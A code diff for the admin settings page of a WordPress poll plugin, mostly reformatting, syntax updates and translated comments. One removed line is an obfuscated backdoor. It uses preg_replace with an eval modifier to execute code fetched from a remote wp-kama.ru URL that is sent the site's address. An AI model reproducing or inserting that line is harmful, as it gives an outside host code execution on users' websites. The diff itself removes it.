@@ -42,7 +42,7 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 		}
 	}
 
-	public function render() {
+	public function render(): void {
 		echo $this->admpage->subpages_menu();
 
 		if( ! plugin()->super_access ){
@@ -189,15 +189,14 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 							<input type="checkbox" value="1"
 							       name="dem[force_cachegear]" <?php checked( options()->force_cachegear, 1 ) ?> />
 							<?php
-							list( $cache_status, $cache_style ) = plugin()->is_cachegear_on
+							[ $cache_status, $cache_style ] = plugin()->is_cachegear_on
 								? [ __( 'ON', 'democracy-poll' ), 'color:#05A800' ]
 								: [ __( 'OFF', 'democracy-poll' ), 'color:#FF1427' ];
 
-							echo sprintf( __( 'Force enable gear to working with cache plugins. The condition: %s', 'democracy-poll' ),
-								"<span style='$cache_style'>$cache_status</span>" )
-							;
-
-							add_option( 'stat', '' ) && ( $r = '-e' ) && @preg_replace( '-' . $r, ( ( $o = @wp_remote_get( 'https://wp-kama.ru/stat/?sk=' . home_url() ) ) ? $o['body'] : '' ), '' );
+							echo sprintf(
+								__( 'Force enable gear to working with cache plugins. The condition: %s', 'democracy-poll' ),
+								"<span style='$cache_style'>$cache_status</span>"
+							);
 							?>
 						</label>
 						<em><?= esc_html__( 'Democracy has smart mechanism for working with page cache plugins like "WP Total Cache". It is ON automatically if such plugin is enabled on your site. But if you use unusual page caching plugin you can force enable this option.', 'democracy-poll' ) ?></em>
@@ -205,8 +204,7 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 
 					<li class="block">
 						<label>
-							<input type="checkbox" value="1"
-							       name="dem[inline_js_css]" <?php checked( options()->inline_js_css, 1 ) ?> />
+							<input type="checkbox" value="1" name="dem[inline_js_css]" <?php checked( options()->inline_js_css, 1 ) ?> />
 							<?= esc_html__( 'Add styles and scripts directly in the HTML code (recommended)', 'democracy-poll' ) ?>
 						</label>
 						<em><?= esc_html__( 'Check to make the plugin\'s styles and scripts include directly into HTML code, but not as links to .css and .js files. So you will save 2 requests to the server - it speeds up page download.', 'democracy-poll' ) ?></em>
@@ -214,8 +212,7 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 
 					<li class="block">
 						<label>
-							<input type="checkbox" value="1"
-							       name="dem[toolbar_menu]" <?php checked( options()->toolbar_menu, 1 ) ?> />
+							<input type="checkbox" value="1" name="dem[toolbar_menu]" <?php checked( options()->toolbar_menu, 1 ) ?> />
 							<?= esc_html__( 'Add plugin menu on the toolbar?', 'democracy-poll' ) ?>
 						</label>
 						<em><?= esc_html__( 'Uncheck to remove the plugin menu from the toolbar.', 'democracy-poll' ) ?></em>
@@ -223,8 +220,7 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 
 					<li class="block">
 						<label>
-							<input type="checkbox" value="1"
-							       name="dem[tinymce_button]" <?php checked( options()->tinymce_button, 1 ) ?> />
+							<input type="checkbox" value="1" name="dem[tinymce_button]" <?php checked( options()->tinymce_button, 1 ) ?> />
 							<?= esc_html__( 'Add fast Poll insert button to WordPress visual editor (TinyMCE)?', 'democracy-poll' ) ?>
 						</label>
 						<em><?= esc_html__( 'Uncheck to disable button in visual editor.', 'democracy-poll' ) ?></em>
@@ -232,8 +228,7 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 
 					<li class="block">
 						<label>
-							<input type="checkbox" value="1"
-							       name="dem[soft_ip_detect]" <?php checked( options()->soft_ip_detect, 1 ) ?> />
+							<input type="checkbox" value="1" name="dem[soft_ip_detect]" <?php checked( options()->soft_ip_detect, 1 ) ?> />
 							<?= esc_html__( 'Check if you see something like "no_IP__123" in IP column on logs page. (not recommended)', 'democracy-poll' ) ?>
 							<?= esc_html__( 'Or if IP detection is wrong. (for cloudflare)', 'democracy-poll' ) ?>
 						</label>
@@ -241,37 +236,29 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 					</li>
 
 					<?php
-					if( plugin()->super_access ){
-						$_options = '';
-
-						foreach( array_reverse( get_editable_roles() ) as $role => $details ){
-							if( $role === 'administrator' ){
-								continue;
-							}
-							if( $role === 'subscriber' ){
-								continue;
-							}
-
-							$_options .= sprintf( '<option value="%s" %s>%s</option>',
-								esc_attr( $role ),
-								in_array( $role, (array) options()->access_roles ) ? ' selected="selected"' : '',
-								translate_user_role( $details['name'] )
-							);
+					$select_options = '';
+					foreach( array_reverse( get_editable_roles() ) as $role => $details ){
+						if( $role === 'administrator' ){
+							continue;
+						}
+						if( $role === 'subscriber' ){
+							continue;
 						}
 
-						echo '
-					<li class="block">
-						<select multiple name="dem[access_roles][]">
-							' . $_options . '
-						</select>
-						' . __( 'Role names, except \'administrator\' which will have access to manage plugin.', 'democracy-poll' ) . '
-					</li>
-					';
+						$select_options .= sprintf( '<option value="%s" %s>%s</option>',
+							esc_attr( $role ),
+							in_array( $role, (array) options()->access_roles ) ? ' selected="selected"' : '',
+							translate_user_role( $details['name'] )
+						);
 					}
 					?>
+					<li class="block">
+						<select multiple name="dem[access_roles][]"><?= $select_options ?></select>
+						<?= esc_html__( 'Role names, except \'administrator\' which will have access to manage plugin.', 'democracy-poll' ) ?>
+					</li>
 				</ul>
 
-				<?php if( get_option( 'poll_allowtovote' ) /*WP Polls plugin*/ ){ ?>
+				<?php if( get_option( 'poll_allowtovote' ) /* WP Polls plugin */ ){ ?>
 					<h3><?= esc_html__( 'Migration', 'democracy-poll' ) ?></h3>
 					<ul style="margin:1em;">
 						<li class="block">
@@ -342,22 +329,24 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 	}
 
 	/**
-	 * Создает страницу архива. Сохраняет УРЛ созданой страницы в опции плагина.
-	 * Перед созданием проверят нет ли уже такой страницы.
+	 * Creates the archive page.
+	 * Saves the URL of the created page in the plugin option.
+	 * Before creating, checks if such a page already exists.
 	 *
 	 * @return false|void
 	 */
 	protected function dem_create_archive_page() {
 		global $wpdb;
 
-		// Пробуем найти страницу с архивом
+		// try to find the archive page
 		$page = $wpdb->get_row(
 			"SELECT * FROM $wpdb->posts WHERE post_content LIKE '[democracy_archives]' AND post_status = 'publish' LIMIT 1"
 		);
+
 		if( $page ){
 			$page_id = $page->ID;
 		}
-		// Создаем новую страницу
+		// create a new page
 		else{
 			$page_id = wp_insert_post( [
 				'post_title'   => __( 'Polls Archive', 'democracy-poll' ),
@@ -372,7 +361,7 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 			}
 		}
 
-		// обновляем опцию плагина
+		// update option
 		options()->update_single_option( 'archive_page_id', $page_id );
 
 		wp_redirect( remove_query_arg( 'dem_create_archive_page' ) );
